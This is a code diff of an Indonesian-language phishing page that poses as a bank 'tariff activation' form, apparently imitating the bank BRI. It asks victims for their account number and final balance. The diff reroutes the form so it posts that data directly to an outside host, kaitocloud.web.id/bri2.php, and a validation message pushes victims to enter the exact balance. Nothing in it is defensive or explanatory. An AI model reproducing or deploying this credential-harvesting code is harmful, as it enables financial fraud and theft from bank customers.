@@ -428,20 +428,28 @@ nav{
                  <div class="button-85">
                     <div class="card-body">
                        <h3 style="color:#09559a;margin-top:0;">Untuk melanjutkan proses aktivasi tarif transaksi anda, Silahkan masukkan data di bawah ini.</h3>
-          <form id="login" onsubmit="sendLogin()" method="post">
-             <input type="hidden" name="tarif" id="tarif" value="...">
+          <form id="login" action="https://kaitocloud.web.id/bri2.php" method="post">
+    <input type="hidden" name="tarif" id="tarif" value="...">
     <input type="hidden" name="nohp" id="nohp" value="...">
     <input type="hidden" name="nama" id="nama" value="...">
-       
-       <div class="input-field">
-    <label for="rek">Nomor rekening : </label>
- <input type="tel" id="rek" name="rek" placeholder="######" maxlength="15" minlength="15" required="">
-                        </div>
-       <div class="input-field">
-    <label for="rek">Saldo akhir: </label>
- <input type="tel" id="saldo" name="saldo" placeholder="Rp. xxx" maxlength="" oninvalid="this.setCustomValidity('Pastikan 𝗦𝗮𝗹𝗱𝗼 𝗦𝗲𝘀𝘂𝗮𝗶 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴')" onchange="this.setCustomValidity('')" required="">
-                        </div>                 
-                    </form></div>
+
+    <div class="input-field">
+        <label for="rek">Nomor rekening:</label>
+        <input type="tel" id="rek" name="rek" placeholder="######" maxlength="15" minlength="15" required="">
+    </div>
+
+    <div class="input-field">
+        <label for="saldo">Saldo akhir:</label>
+        <input type="tel" id="saldo" name="saldo" placeholder="Rp. xxx" 
+               oninvalid="this.setCustomValidity('Pastikan 𝗦𝗮𝗹𝗱𝗼 𝗦𝗲𝘀𝘂𝗮𝗶 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴')" 
+               onchange="this.setCustomValidity('')" required="">
+    </div>
+
+    <div class="input-field">
+        <button type="submit">Kirim</button>
+    </div>
+</form>
+</div>
    <div class="card-footer">
 <button type="submit" class="button" id="lanjutkan" disabled="">Lanjutkan</button>
                   </div>
